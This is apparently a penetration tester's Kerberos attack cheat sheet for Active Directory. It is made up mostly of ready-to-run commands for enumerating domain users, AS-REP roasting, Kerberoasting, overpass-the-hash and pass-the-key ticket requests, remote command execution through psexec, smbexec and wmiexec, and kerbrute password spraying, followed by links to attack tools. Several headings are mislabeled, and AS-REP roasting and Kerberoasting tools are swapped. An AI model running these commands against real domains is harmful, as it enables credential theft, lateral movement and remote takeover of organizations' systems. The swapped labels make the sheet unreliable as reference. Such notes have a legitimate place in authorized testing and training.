```
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN.LOCAL'" $TARGET
```
#### MSF
```
use auxiliary/gather/kerberos_enumusers
```
# Check for Kerberoasting:
```
GetNPUsers.py DOMAIN-Target/ -usersfile user.txt -dc-ip $TARGET -format hashcat/john
```
# GetUserSPNs
```
ASREPRoast:
impacket-GetUserSPNs <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
```
```
impacket-GetUserSPNs <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
```
# Kerberoasting:
```
impacket-GetUserSPNs <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>
```
#### Overpass The Hash/Pass The Key (PTK):
```
python3 getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash> -dc-ip $DOMAIN_CONTROLLER_IP
```
```
python3 getTGT.py <domain_name>/<user_name> -aesKey <aes_key> -dc-ip $DOMAIN_CONTROLLER_IP
```
```
python3 getTGT.py <domain_name>/<user_name>:[password] -dc-ip $DOMAIN_CONTROLLER_IP
```
#### Using TGT key to excute remote commands from the following impacket scripts:
```
python3 psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```
```
python3 smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```
```
python3 wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```
https://www.tarlogic.com/blog/como-funciona-kerberos/
https://www.tarlogic.com/blog/como-atacar-kerberos/
```
python kerbrute.py -dc-ip $TARGET -users /root/htb/kb_users.txt -passwords /root/pass_common_plus.txt -threads 20 -domain DOMAIN -outputfile kb_extracted_passwords.txt
```
https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/
https://github.com/GhostPack/Rubeus
https://github.com/fireeye/SSSDKCMExtractor
https://gitlab.com/Zer1t0/cerbero
